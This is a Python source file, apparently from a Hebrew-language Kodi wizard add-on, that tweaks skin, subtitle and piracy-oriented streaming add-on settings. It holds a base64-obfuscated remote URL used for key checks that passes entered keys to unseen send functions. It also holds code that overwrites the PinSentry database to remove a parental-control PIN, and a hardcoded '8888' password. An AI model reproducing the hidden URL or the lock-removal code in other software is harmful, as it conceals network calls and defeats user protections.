		setting_file=os.path.join(translatepath("special://userdata"),"addon_data", "skin.Meir.mod","settings.xml")

		file = open(setting_file, 'r') 
		file_data= file.read()
		file.close()
		regex='<setting id="Skin.ForcedView.genres" type="string(.+?)/setting>'
		m=re.compile(regex).findall(file_data)[0]
		file = open(setting_file, 'w') 
		file.write(file_data.replace('<setting id="Skin.ForcedView.genres" type="string%s/setting>'%m,'<setting id="Skin.ForcedView.genres" type="string"></setting>'))
		file.close()
		setting_file=os.path.join(translatepath("special://userdata"),"addon_data", "skin.Meir.mod","settings.xml")

		file = open(setting_file, 'r') 
		file_data= file.read()
		file.close()
		regex='<setting id="Skin.ForcedView.tvshows" type="string(.+?)/setting>'
		m=re.compile(regex).findall(file_data)[0]
		file = open(setting_file, 'w') 
		file.write(file_data.replace('<setting id="Skin.ForcedView.tvshows" type="string%s/setting>'%m,'<setting id="Skin.ForcedView.tvshows" type="string"></setting>'))
		file.close()
		setting_file=os.path.join(translatepath("special://userdata"),"addon_data", "skin.Meir.mod","settings.xml")

		file = open(setting_file, 'r') 
		file_data= file.read()
		file.close()
		regex='<setting id="Skin.ForcedView.seasons" type="string(.+?)/setting>'
		m=re.compile(regex).findall(file_data)[0]
		file = open(setting_file, 'w') 
		file.write(file_data.replace('<setting id="Skin.ForcedView.seasons" type="string%s/setting>'%m,'<setting id="Skin.ForcedView.seasons" type="string"></setting>'))
		file.close()
		dialog = xbmcgui.Dialog()
		dialog.ok("Kodi Setting", 'התיקון עבר בהצלחה, הקודי יסדר כעת')
		os._exit(1)
        
        
def resetSKinSetting():
		os.remove(os.path.join(translatepath("special://userdata/"),"addon_data", "skin.Meir.mod", "settings.xml"))

		dialog = xbmcgui.Dialog()
		dialog.ok("Kodi Setting", 'התיקון עבר בהצלחה, הקודי יסדר כעת')
		os._exit(1)
        
#  src=__PLUGIN_PATH__ + "/resources/skinpfix/settings.xml"
#  dst=xbmc . translatePath ( 'special://userdata/addon_data/skin.Meir.mod')+"/settings.xml"
  
#  copyfile(src,dst)
#  dialog = xbmcgui.Dialog()
#  dialog.ok("Kodi Setting", 'התיקון עבר בהצלחה, הקודי יסדר כעת')
#  os._exit(1)
def skin_efix():
  src=__PLUGIN_PATH__ + "/resources/skinefix/settings.xml"
  dst=xbmc . translatePath ( 'special://userdata/addon_data/skin.Meir.mod')+"/settings.xml"
  
  copyfile(src,dst)
  dialog = xbmcgui.Dialog()
  dialog.ok("Kodi Setting", 'התיקון עבר בהצלחה, הקודי יסדר כעת')
  os._exit(1)
def VICTORYRD_ON():
  Addon = xbmcaddon.Addon('plugin.video.allmoviesin')
  Addon.setSetting('rdsource','true')
  Addon.setSetting('super_fast_type_torent','true')
  xbmc.executebuiltin("RunPlugin(plugin://plugin.video.allmoviesin?mode=138&url=www)")
  # xbmc.executebuiltin((u'Notification(%s,%s)' % ('Kodi Anonymous', 'הגדרת RD בוצע בהצלחה')))
def VICTORYRD_OFF():
  Addon = xbmcaddon.Addon('plugin.video.allmoviesin')
  Addon.setSetting('rdsource','false')
  Addon.setSetting('super_fast_type_torent','false')
  xbmc.executebuiltin("RunPlugin(plugin://plugin.video.allmoviesin?mode=137&url=www)")
  # xbmc.executebuiltin((u'Notification(%s,%s)' % ('Kodi Anonymous', 'ביטול RD הוגדר בהצלחה')))
  
def VICTORY_AutoplayON():
  Addon = xbmcaddon.Addon('plugin.video.allmoviesin')
  Addon.setSetting('super_fast','true')
  xbmc.executebuiltin((u'Notification(%s,%s)' % ('Kodi Anonymous', 'ניגון מהיר הופעל')))
  
def VICTORY_AutoplayOFF():
  Addon = xbmcaddon.Addon('plugin.video.allmoviesin')
  Addon.setSetting('super_fast','false')
  xbmc.executebuiltin((u'Notification(%s,%s)' % ('Kodi Anonymous', 'ניגון מהיר בוטל')))
  
  

def RD_resolveurl():
  xbmc.executebuiltin("RunPlugin(plugin://script.module.resolveurl/?mode=auth_rd)")

  
def RD_seren():
  xbmc.executebuiltin("RunPlugin(plugin://plugin.video.seren/?action=authRealDebrid)")

  
def RD_gaia():
  xbmc.executebuiltin("RunPlugin(plugin://plugin.video.gaia/?action=realdebridAuthentication)")
def Set_victory():
    dialog = xbmcgui.Dialog()
    funcs = (
        movie1,
        movie2,
        movie3,
        movie4,
        movie5,
        movie6,
        movie7,
        movie8,
        movie9,
        )
        
    call = dialog.select('תפריט הגדרות לויקטורי', [
	'[COLOR=white]מצב ברירת מחדל[/COLOR]', 
	'[COLOR=white]אפשר טורנטים[/COLOR]', 
	'[COLOR=white]הצג רק טורנטים בלבד[/COLOR]', 
	'[COLOR=white]הגדר איכות 720P בלבד[/COLOR]',
	'[COLOR=white]הצג טריילר בזמן חיפוש מקורות[/COLOR]',
	'[COLOR=white]בטל טריילר בזמן חיפוש מקורות[/COLOR]',
	'[COLOR=white]מצב ניגון סופר מהיר![/COLOR]',
	'[COLOR=white]מצב ניגון סופר מהיר! - בעלי חשבון RD[/COLOR]',
	'[COLOR=white]ניקוי מטמון[/COLOR]',])
    if call:
        if call < 0:
            return
        func = funcs[call-9]
        return func()
    else:
        func = funcs[call]
        return func()
    return 


def movie1():

      Addon = xbmcaddon.Addon('plugin.video.allmoviesin')
      Addon.setSetting('new_window_type2','4')
      Addon.setSetting('play_first','false')
      Addon.setSetting('auto_enable_new','false')
      # Addon.setSetting('magnet','false')
      # Addon.setSetting('torrent_server','false')
      Addon.setSetting('heb_server','true')
      Addon.setSetting('google_server','true')
      Addon.setSetting('rapid_server','true')
      Addon.setSetting('direct_server','true')
      Addon.setSetting('heb_server_tv','true')
      Addon.setSetting('google_server_tv','true')
      Addon.setSetting('rapid_server_tv','true')
      Addon.setSetting('direct_server_tv','true')
      Addon.setSetting('torrent_server_tv','false')
      Addon.setSetting('auto_q_source','false')
      Addon.setSetting('max_quality_m','0')
      Addon.setSetting('max_quality_t','0')
      Addon.setSetting('all_t','0')
      Addon.setSetting('rd_only','false')
      Addon.setSetting('super_fast','false')
      Addon.setSetting('super_fast_type_torent','false')
      xbmc.executebuiltin((u'Notification(%s,%s)' % ('Kodi Anonymous', 'בוצע!')))
      
      
      
def movie2():
      Addon = xbmcaddon.Addon('plugin.video.allmoviesin')
      Addon.setSetting('magnet','true')
      Addon.setSetting('torrent_server','true')
      xbmc.executebuiltin((u'Notification(%s,%s)' % ('Kodi Anonymous', 'בוצע!')))
def movie3():
      Addon = xbmcaddon.Addon('plugin.video.allmoviesin')
      Addon.setSetting('heb_server','false')
      Addon.setSetting('google_server','false')
      Addon.setSetting('rapid_server','false')
      Addon.setSetting('direct_server','false')
      Addon.setSetting('heb_server_tv','false')
      Addon.setSetting('google_server_tv','false')
      Addon.setSetting('rapid_server_tv','false')
      Addon.setSetting('direct_server_tv','false')
      Addon.setSetting('torrent_server_tv','true')
      Addon.setSetting('torrent_server','true')
      Addon.setSetting('all_t','1')
      Addon.setSetting('magnet','true')
      
      xbmc.executebuiltin((u'Notification(%s,%s)' % ('Kodi Anonymous', 'בוצע!')))

def movie4():
      Addon = xbmcaddon.Addon('plugin.video.allmoviesin')
      Addon.setSetting('auto_q_source','true')
      Addon.setSetting('max_quality_m','2')
      Addon.setSetting('max_quality_t','2')
      xbmc.executebuiltin((u'Notification(%s,%s)' % ('Kodi Anonymous', 'בוצע!')))
def movie5():
      Addon = xbmcaddon.Addon('plugin.video.allmoviesin')
      Addon.setSetting('video_in_sources','true')
      xbmc.executebuiltin((u'Notification(%s,%s)' % ('Kodi Anonymous', 'בוצע!')))
def movie6():
      Addon = xbmcaddon.Addon('plugin.video.allmoviesin')
      Addon.setSetting('video_in_sources','false')
      xbmc.executebuiltin((u'Notification(%s,%s)' % ('Kodi Anonymous', 'בוצע!')))
      
def movie7():
      Addon = xbmcaddon.Addon('plugin.video.allmoviesin')
      Addon.setSetting('all_t','0')
      Addon.setSetting('rd_only','false')
      Addon.setSetting('super_fast','true')
      Addon.setSetting('super_fast_type_torent','false')
      
      xbmc.executebuiltin((u'Notification(%s,%s)' % ('Kodi Anonymous', 'בוצע!')))
def movie8():
      Addon = xbmcaddon.Addon('plugin.video.allmoviesin')
      Addon.setSetting('all_t','1')
      Addon.setSetting('rd_only','true')
      Addon.setSetting('super_fast','true')
      Addon.setSetting('super_fast_type_torent','true')
      xbmc.executebuiltin((u'Notification(%s,%s)' % ('Kodi Anonymous', 'בוצע!')))
def movie9():
      Addon = xbmcaddon.Addon('plugin.video.allmoviesin')
      xbmc.executebuiltin("RunPlugin(plugin://plugin.video.allmoviesin/?url=www&mode=16)" )

      xbmc.executebuiltin((u'Notification(%s,%s)' % ('Kodi Anonymous', 'מנקה מטמון...')))
def Set_OSD():
    dialog = xbmcgui.Dialog()
    funcs = (
        # tv1,
        # tv2,
        # tv3,
        # tv4,
        tv5,
        tv6,
		tv7,
        tv8,
        tv9,
        tv10,
        tv11,
        tv12,
        tv13,
        tv14,
        tv15,
        tv16,
        )
        
    call = dialog.select('תפריט מדיה', [
	# 'נוגן לאחרונה', 
	# 'סרט אחרון שנוגן - ויקטורי',
	# 'פרק אחרון שנוגן - ויקטורי',
	# 'מקורות אחרונים',
	
	'גודל כתוביות - קטן',
	'גודל כתוביות - רגיל',
	'גודל כתוביות - גדול',
	
	'התאמת כתוביות לשפה הקריליות',
	'ביטול התאמת כתוביות לשפה הקריליות',
	'התאמת כתוביות לשפה אנגלית',
	'התאמת כתוביות לשפה ספרדית',
	'התאמת כתוביות לשפה רוסית',
	'התאמת כתוביות לשפה עברית',
	'חלון מסך מלא',
	'שנה את שפת השמע לאנגלית',
	'שנה את שפת השמע לרוסית',])
    if call:
        if call < 0:
            return
        func = funcs[call-16]
        return func()
    else:
        func = funcs[call]
        return func()
    return 

def tv1():
   xbmc.executebuiltin( "XBMC.ActivateWindow(1169)" )
def tv2():
   xbmc.executebuiltin("PlayMedia(plugin://plugin.video.allmoviesin/?url=latest_movie&mode=5&name=[COLOR yellow][I]לינק סרט אחרון[/I][/COLOR]&data=%20&iconimage=http%3A%2F%2Fimage.tmdb.org%2Ft%2Fp%2Foriginal%2F%2FqjpjS5iRc9RVY8zdgSTD3ecGyvb.jpg&fanart=http%3A%2F%2Fimage.tmdb.org%2Ft%2Fp%2Foriginal%2F%2FhSKe2uCNRMl1hfwXpj29K2PkvgG.jpg&description=המרדף האגוזי של סקארט אחר הבלוט המקולל, שנמשך מאז תחילת הזמן, גורם להשלכות עולמיות - תזוזת יבשות עולמית שמתחילה את הרפתקה הגדולה ביותר למני, דייגו וסיד. לאחר התהפוכות הגדולות בסדר היבשות, סיד מתאחד עם משפחתו האבודה, לאחר איחוד המשפחות החבורה פוגשת בדרכה הביתה חיות חדשות שרוצות למנוע מהן לחזור לשם.-HebDub-&original_title=%20&id=%20&season=%20&episode=%20&saved_name= &prev_name=%20&eng_name=%20&heb_name=%20&show_original_year=%20)" )
def tv3():
   xbmc.executebuiltin("PlayMedia(plugin://plugin.video.allmoviesin/?url=latest_tv&mode=5&name=[COLOR yellow][I]לינק סדרה אחרון[/I][/COLOR]&data=2008&iconimage=https%3A%2F%2Fimages-na.ssl-images-amazon.com%2Fimages%2FM%2FMV5BMTQ0ODYzODc0OV5BMl5BanBnXkFtZTgwMDk3OTcyMDE%40._V1_SY1000_CR0%2C0%2C678%2C1000_AL_.jpg&fanart=https%3A%2F%2Fimages-na.ssl-images-amazon.com%2Fimages%2FM%2FMV5BMTQ0ODYzODc0OV5BMl5BanBnXkFtZTgwMDk3OTcyMDE%40._V1_SY1000_CR0%2C0%2C678%2C1000_AL_.jpg&description=עונה 1 פרק 1&original_title=Breaking.Bad&id=&season=1&episode=1&saved_name=Breaking.Bad&prev_name=%20&eng_name=%20&heb_name=%20&show_original_year=2008)" )
oo='/keykey.xml'
def tv4():
   xbmc.executebuiltin("PlayMedia(plugin://plugin.video.allmoviesin/?url=https%3A%2F%2F1fichier.com%2F%3F1f43zrtmky&mode=75&name=%5BCOLOR+yellow%5D%5BI%5D%D7%9E%D7%A7%D7%95%D7%A8%D7%95%D7%AA+%D7%90%D7%97%D7%A8%D7%95%D7%A0%D7%99%D7%9D%5B%2FI%5D%5B%2FCOLOR%5D)" )
def tv5():
	req =  xbmc.executeJSONRPC('{"jsonrpc":"2.0","method":"Settings.GetSettings","id":1}')

	jsonRPCRes = json.loads(req);
	settingsList = jsonRPCRes["result"]["settings"]

	audioSetting =  [item for item in settingsList if item["id"] ==  "audiooutput.audiodevice"][0]
	audioDeviceOptions = audioSetting["options"];
	activeAudioDeviceValue = audioSetting["value"];

	activeAudioDeviceId = [index for (index, option) in enumerate(audioDeviceOptions) if option["value"] == activeAudioDeviceValue][0];

	nextIndex = ( activeAudioDeviceId + 1 ) % len(audioDeviceOptions)

	nextValue = audioDeviceOptions[nextIndex]["value"]
	nextName = audioDeviceOptions[nextIndex]["label"]

	changeReq =  xbmc.executeJSONRPC('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","params":{"setting":"subtitles.height","value":37},"id":1}' )

	try:
		changeResJson = json.loads(changeReq);

		if changeResJson["result"] != True:
			raise Exception
	except:
		sys.stderr.write("Error switching audio output device")
		raise Exception
	xbmc.executebuiltin("ReloadSkin()")
def tv6():
	req =  xbmc.executeJSONRPC('{"jsonrpc":"2.0","method":"Settings.GetSettings","id":1}')

	jsonRPCRes = json.loads(req);
	settingsList = jsonRPCRes["result"]["settings"]

	audioSetting =  [item for item in settingsList if item["id"] ==  "audiooutput.audiodevice"][0]
	audioDeviceOptions = audioSetting["options"];
	activeAudioDeviceValue = audioSetting["value"];

	activeAudioDeviceId = [index for (index, option) in enumerate(audioDeviceOptions) if option["value"] == activeAudioDeviceValue][0];

	nextIndex = ( activeAudioDeviceId + 1 ) % len(audioDeviceOptions)

	nextValue = audioDeviceOptions[nextIndex]["value"]
	nextName = audioDeviceOptions[nextIndex]["label"]

	changeReq =  xbmc.executeJSONRPC('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","params":{"setting":"subtitles.height","value":40},"id":1}' )

	try:
		changeResJson = json.loads(changeReq);

		if changeResJson["result"] != True:
			raise Exception
	except:
		sys.stderr.write("Error switching audio output device")
		raise Exception
	xbmc.executebuiltin("ReloadSkin()")
def tv7():
	req =  xbmc.executeJSONRPC('{"jsonrpc":"2.0","method":"Settings.GetSettings","id":1}')

	jsonRPCRes = json.loads(req);
	settingsList = jsonRPCRes["result"]["settings"]

	audioSetting =  [item for item in settingsList if item["id"] ==  "audiooutput.audiodevice"][0]
	audioDeviceOptions = audioSetting["options"];
	activeAudioDeviceValue = audioSetting["value"];

	activeAudioDeviceId = [index for (index, option) in enumerate(audioDeviceOptions) if option["value"] == activeAudioDeviceValue][0];

	nextIndex = ( activeAudioDeviceId + 1 ) % len(audioDeviceOptions)

	nextValue = audioDeviceOptions[nextIndex]["value"]
	nextName = audioDeviceOptions[nextIndex]["label"]

	changeReq =  xbmc.executeJSONRPC('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","params":{"setting":"subtitles.height","value":46},"id":1}' )

	try:
		changeResJson = json.loads(changeReq);

		if changeResJson["result"] != True:
			raise Exception
	except:
		sys.stderr.write("Error switching audio output device")
		raise Exception
	xbmc.executebuiltin("ReloadSkin()")
def tv8():
   xbmc.executebuiltin( "Action(ShowSubtitles)" )
   xbmc.executeJSONRPC('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.charset","value":"CP1251"}}')
   xbmc.executeJSONRPC('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"arial.ttf"}}')
   xbmc.executebuiltin( "Action(ShowSubtitles)" )
def tv9():
   xbmc.executebuiltin( "Action(ShowSubtitles)" )
   xbmc.executeJSONRPC('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.charset","value":"DEFAULT"}}')
   xbmc.executeJSONRPC('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')
   xbmc.executebuiltin( "Action(ShowSubtitles)" )
def tv10():
      Addon = xbmcaddon.Addon('service.subtitles.All_Subs')
      Addon.setSetting('auto_translate','false')
      xbmc.executeJSONRPC('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.subtitlelanguage","value":"English"}}')
      xbmc.executebuiltin((u'Notification(%s,%s)' % ('Kodi Anonymous', '[COLOR=yellow]הגדרת הורדת כתובית בוצעה בהצלחה[/COLOR]')))

def tv11():
      Addon = xbmcaddon.Addon('service.subtitles.All_Subs')
      Addon.setSetting('auto_translate','false')
      xbmc.executeJSONRPC('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.subtitlelanguage","value":"Spanish"}}')
      xbmc.executebuiltin((u'Notification(%s,%s)' % ('Kodi Anonymous', '[COLOR=yellow]הגדרת הורדת כתובית בוצעה בהצלחה[/COLOR]')))
def tv12():
      Addon = xbmcaddon.Addon('service.subtitles.All_Subs')
      Addon.setSetting('auto_translate','false')
      xbmc.executeJSONRPC('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.subtitlelanguage","value":"Russian"}}')
      xbmc.executebuiltin((u'Notification(%s,%s)' % ('Kodi Anonymous', 'הגדרת הורדת כתובית בוצעה בהצלחה')))
def tv13():
      Addon = xbmcaddon.Addon('service.subtitles.All_Subs')
      Addon.setSetting('auto_translate','true')
      xbmc.executeJSONRPC('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.subtitlelanguage","value":"Hebrew"}}')
      xbmc.executebuiltin((u'Notification(%s,%s)' % ('Kodi Anonymous', '[COLOR=yellow]הגדרת הורדת כתובית בוצעה בהצלחה[/COLOR]')))
def tv14():
	xbmc.executebuiltin('Action(togglefullscreen)')
def tv15():
   xbmc.executeJSONRPC('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.audiolanguage","value":"English"}}')
   xbmc.executebuiltin( "Action(audionextlanguage)" )
def tv16():
   xbmc.executeJSONRPC('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.audiolanguage","value":"Russian"}}')
   xbmc.executebuiltin( "Action(audionextlanguage)" )

def reset_telemedia():
   iiI1iIiI = xbmc . translatePath ( os . path . join ( 'special://home/userdata/addon_data' , 'plugin.video.telemedia' ) )
   # OOooO = os . path . join ( iiI1iIiI , 'isr.zip' )
   # xbmc.executebuiltin("RunPlugin(plugin://plugin.video.telemedia?mode=21&url=www)" )
   xbmc.executebuiltin((u'Notification(%s,%s)' % ('לסיום הפעולה', 'הקודי יסגר אוטומטית')))
  
   # os.remove(iiI1iIiI)
   shutil.rmtree(iiI1iIiI,ignore_errors=True, onerror=None)
   xbmc.sleep(8000)
   os._exit(1)


urlx = base64.b64decode("aHR0cDovL2tvZGkubGlmZS93aXphcmQ=").decode('utf-8') + oo
def SUBS_English():
      Addon = xbmcaddon.Addon('service.subtitles.All_Subs')
      Addon.setSetting('auto_translate','false')
      xbmc.executeJSONRPC('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.subtitlelanguage","value":"English"}}')
      xbmc.executebuiltin((u'Notification(%s,%s)' % ('Kodi Anonymous', 'הגדרת הורדת כתובית בוצעה בהצלחה')))
	  
      
def telemediaMod():
      Addon = xbmcaddon.Addon('plugin.video.anonymous.wall')
      Addon.setSetting('StreamMovies','Telemedia')
      
def victoryMod():
      Addon = xbmcaddon.Addon('plugin.video.anonymous.wall')
      Addon.setSetting('StreamMovies','Shadow')
      
def purnpass():
    input= '8888'
    dialog = xbmcgui.Dialog()
    search_entered=''
    #keyboard = dialog.numeric(0, 'הכנס סיסמה')
    # keyboard = xbmc.Keyboard(search_entered, 'הכנס סיסמה')
    keyboard = dialog.numeric(0, 'הכנס סיסמה')
    # keyboard.doModal()
    # if keyboard.isConfirmed():
    search_entered = keyboard
    if search_entered=='8888':
       xbmc.executebuiltin( "ActivateWindow(1113)" )
    else:
      LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE),'[COLOR %s]סיסמה שגויה[/COLOR]' % COLOR2)
      sys.exit()

                  
                  
                  

def DIS_WIDGET():
       xbmc.executebuiltin( "XBMC.Skin.ToggleSetting(none_widget)" )
       xbmc.executebuiltin( "XBMC.Skin.ToggleSetting(DisableAllWidgets)" )
       xbmc.executebuiltin((u'Notification(%s,%s)' % ('Kodi Anonymous', 'ההגדרה בוצעה בהצלחה')))
def SUBS_Spanish():
      Addon = xbmcaddon.Addon('service.subtitles.All_Subs')
      Addon.setSetting('auto_translate','false')
      xbmc.executeJSONRPC('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.subtitlelanguage","value":"Spanish"}}')
      xbmc.executebuiltin((u'Notification(%s,%s)' % ('Kodi Anonymous', 'הגדרת הורדת כתובית בוצעה בהצלחה')))
def SUBS_Russian():
      Addon = xbmcaddon.Addon('service.subtitles.All_Subs')
      Addon.setSetting('auto_translate','false')
      xbmc.executeJSONRPC('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.subtitlelanguage","value":"Russian"}}')
      xbmc.executebuiltin((u'Notification(%s,%s)' % ('Kodi Anonymous', 'הגדרת הורדת כתובית בוצעה בהצלחה')))
def SUBS_Portugezit():
      Addon = xbmcaddon.Addon('service.subtitles.All_Subs')
      Addon.setSetting('auto_translate','false')
      xbmc.executeJSONRPC('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.subtitlelanguage","value":"Portuguese"}}')
      xbmc.executebuiltin((u'Notification(%s,%s)' % ('Kodi Anonymous', 'הגדרת הורדת כתובית בוצעה בהצלחה')))  


def SUBS_Hebrew():
      Addon = xbmcaddon.Addon('service.subtitles.All_Subs')
      Addon.setSetting('auto_translate','true')
      xbmc.executeJSONRPC('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.subtitlelanguage","value":"Hebrew"}}')
      xbmc.executebuiltin((u'Notification(%s,%s)' % ('Kodi Anonymous', 'הגדרת הורדת כתובית בוצעה בהצלחה')))

def clean_pass():
  src=__PLUGIN_PATH__ + "/resources/pinsentry_database.db"
  dst=xbmc . translatePath ( 'special://userdata/addon_data/script.pinsentry')+"/pinsentry_database.db"
  
  copyfile(src,dst)
  dialog = xbmcgui.Dialog()
  xbmc.executebuiltin((u'Notification(%s,%s)' % ('Kodi Anonymous', 'סיסמה הוסרה!')))

def fix_font():
  src=__PLUGIN_PATH__ + "/resources/Font.xml"
  dst=xbmc . translatePath ( 'special://home/addons/skin.Meir.mod/16x9')+"/Font.xml"
  
  copyfile(src,dst)
  dialog = xbmcgui.Dialog()
  dialog.ok("Kodi Setting", 'תיקון עבר בהצלחה')
  xbmc.executebuiltin("ReloadSkin()")
def disfix_font():
  src=__PLUGIN_PATH__ + "/resources/disFont.xml"
  dst=xbmc . translatePath ( 'special://home/addons/skin.Meir.mod/16x9')+"/Font.xml"
  
  copyfile(src,dst)
  dialog = xbmcgui.Dialog()
  dialog.ok("Kodi Setting", 'ביטול פונט עבר בהצלחה')
  xbmc.executebuiltin("ReloadSkin()")

def last_play():
  src=__PLUGIN_PATH__ + "/resources/lastPlayed.json"
  dst=xbmc . translatePath ( 'special://userdata/addon_data/plugin.video.last_played')+"/lastPlayed.json"
  
  copyfile(src,dst)
  dialog = xbmcgui.Dialog()
  xbmc.executebuiltin((u'Notification(%s,%s)' % ('Kodi Anonymous', 'ניקוי נוגן לאחרונה הושלם בהצלחה!')))

def normal_metalliq():
  src=__PLUGIN_PATH__ + "/resources/metalliq/1/settings.xml"
  dst=xbmc . translatePath ( 'special://userdata/addon_data/script.module.meta')+"/settings.xml"
  
  copyfile(src,dst)
  dialog = xbmcgui.Dialog()
  xbmc.executebuiltin((u'Notification(%s,%s)' % ('Kodi Anonymous', 'דיאלוג פשוט הוגדר בהצלחה!')))
  if os.path.exists(translatepath("special://home/addons/") + 'script.module.meta'):
    xbmc.executebuiltin("RunPlugin(plugin://script.module.meta/settings/players/all)")
    
    

def userkey(urlx):
   try:
    search_entered=''
    keyboard = xbmc.Keyboard(search_entered, '')
    keyboard.doModal()
    if keyboard.isConfirmed():
           search_entered = keyboard.getText()
    remote_file = urlopen(urlx)
    x=remote_file.readlines()
    found=0
    try:
     for us in x:
        if us.decode('utf-8').split(' ==')[0] ==search_entered or us.decode('utf-8').split()[0]==search_entered :
            found=1
            break
    except:pass
    if found==0:
       LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE), "[COLOR %s]Error[/COLOR]" % COLOR2)
       senderror(search_entered)
       sys.exit()
    else:
        xbmc.executebuiltin( "Skin.ToggleSetting(username)" )
        xbmc.executebuiltin( "ActivateWindow(home)" )
        send(search_entered)
   except:pass
def fast_metalliq():
  src=__PLUGIN_PATH__ + "/resources/metalliq/2/settings.xml"
  dst=xbmc . translatePath ( 'special://userdata/addon_data/script.module.meta')+"/settings.xml"
  
  copyfile(src,dst)
  dialog = xbmcgui.Dialog()
  xbmc.executebuiltin((u'Notification(%s,%s)' % ('Kodi Anonymous', 'דיאלוג מתקדם הוגדר בהצלחה :-)')))
  if os.path.exists(translatepath("special://home/addons/") + 'script.module.meta'):
    xbmc.executebuiltin("RunPlugin(plugin://script.module.meta/settings/players/all)")
def fix_wizard():
  src=__PLUGIN_PATH__ + "/resources/settings.xml"
  dst=xbmc . translatePath ( 'special://userdata/addon_data/plugin.program.Anonymous')+"/settings.xml"
  
  copyfile(src,dst)
  dialog = xbmcgui.Dialog()
  xbmc.executebuiltin((u'Notification(%s,%s)' % ('Kodi Anonymous', 'תיקון הויזארד עבר בהצלחה!')))

def shurtcut():
  src=__PLUGIN_PATH__ + "/resources/shurtcuts/tv/ebs_custom_keyboard.xml"
  dst=xbmc . translatePath ( 'special://userdata/keymaps')+"/ebs_custom_keyboard.xml"
  
  copyfile(src,dst)
  dialog = xbmcgui.Dialog()
  dialog.ok("Kodi Setting", 'השינוי עבר בהצלחה, הקודי יסגר כעת')
  os._exit(1)
def disshurtcut():
  src=__PLUGIN_PATH__ + "/resources/shurtcuts/subs/ebs_custom_keyboard.xml"
  dst=xbmc . translatePath ( 'special://userdata/keymaps')+"/ebs_custom_keyboard.xml"
  
  copyfile(src,dst)
  dialog = xbmcgui.Dialog()
  dialog.ok("Kodi Setting", 'השינוי עבר בהצלחה, הקודי יסגר כעת')
  os._exit(1)
def run_or_install(url):
   type='windows'
   if xbmc.getCondVisibility('system.platform.android'):
       type='android'
   item=url
   
   addon_folder=''
   if item=='torrenter':
     addon_folder='plugin.video.torrenter/'
     names='torrenter'
   else:
     logging.warning(item)
   if item=='popcorn':
     addon_folder='plugin.video.kodipopcorntime/'
     names='popcorn'
   if item=='anonymouswall':
     addon_folder='plugin.video.anonymous.wall/'
     names='anonymouswall'
   if item=='quasar':
     addon_folder='plugin.video.quasar/'
     names='quasar'
   if item=='elementum':
     addon_folder='plugin.video.elementum/'
     names='elementum'
   if item=='gaia':
     addon_folder='plugin.video.gaia/'
     names='gaia'
   if item=='kmedia':
     addon_folder='plugin.video.kmediatorrent/'
     names='kmedia'
   if item=='gdrive':
     addon_folder='plugin.video.gdrive/'
     names='gdrive'
   logging.warning(addon_folder)
   if os.path.exists(translatepath("special://home/addons/") + addon_folder):
       string='ActivateWindow(10025,"plugin://'+addon_folder+'",return)'
       xbmc.executebuiltin(string)
       logging.warning(string)
   else:
     install_pack('auto$$$'+names+'$$$'+type)
   sys.exit()
def install_pack(url):
  logging.warning(url)
  target=url.split('$$$')[1]
  modes=url.split('$$$')[0]
  type=url.split('$$$')[2]
 
  user_dataDir=xbmc . translatePath ( os . path . join ( 'special://userdata' , 'addon_data/plugin.video.torrenter' ) )
  if not os.path.exists(user_dataDir): # check if folder doesnt exist 
     os.makedirs(user_dataDir) # create if it doesnt
  user_dataDir=xbmc . translatePath ( os . path . join ( 'special://userdata' , 'addon_data/plugin.video.kodipopcorntime' ) )
  if not os.path.exists(user_dataDir): # check if folder doesnt exist 
     os.makedirs(user_dataDir) # create if it doesnt
  user_dataDir=xbmc . translatePath ( os . path . join ( 'special://userdata' , 'addon_data/plugin.video.gdrive' ) )
  if not os.path.exists(user_dataDir): # check if folder doesnt exist 
     os.makedirs(user_dataDir) # create if it doesnt
  user_dataDir=xbmc . translatePath ( os . path . join ( 'special://userdata' , 'addon_data/script.module.magnetic' ) )
  if not os.path.exists(user_dataDir): # check if folder doesnt exist 
     os.makedirs(user_dataDir) # create if it doesnt
  user_dataDir=xbmc . translatePath ( os . path . join ( 'special://userdata' , 'addon_data/plugin.video.kmediatorrent' ) )
  if not os.path.exists(user_dataDir): # check if folder doesnt exist 
     os.makedirs(user_dataDir) # create if it doesnt
  user_dataDir=xbmc . translatePath ( os . path . join ( 'special://userdata' , 'addon_data/plugin.video.quasar' ) )
  if not os.path.exists(user_dataDir): # check if folder doesnt exist 
     os.makedirs(user_dataDir) # create if it doesnt
  user_dataDir=xbmc . translatePath ( os . path . join ( 'special://userdata' , 'addon_data/script.quasar.burst' ) )
  if not os.path.exists(user_dataDir): # check if folder doesnt exist 
     os.makedirs(user_dataDir) # create if it doesnt
  user_dataDir=xbmc . translatePath ( os . path . join ( 'special://userdata' , 'addon_data/plugin.video.elementum' ) )
  if not os.path.exists(user_dataDir): # check if folder doesnt exist 
     os.makedirs(user_dataDir) # create if it doesnt
  user_dataDir=xbmc . translatePath ( os . path . join ( 'special://userdata' , 'addon_data/script.elementum.burst' ) )
  if not os.path.exists(user_dataDir): # check if folder doesnt exist 
     os.makedirs(user_dataDir) # create if it doesnt
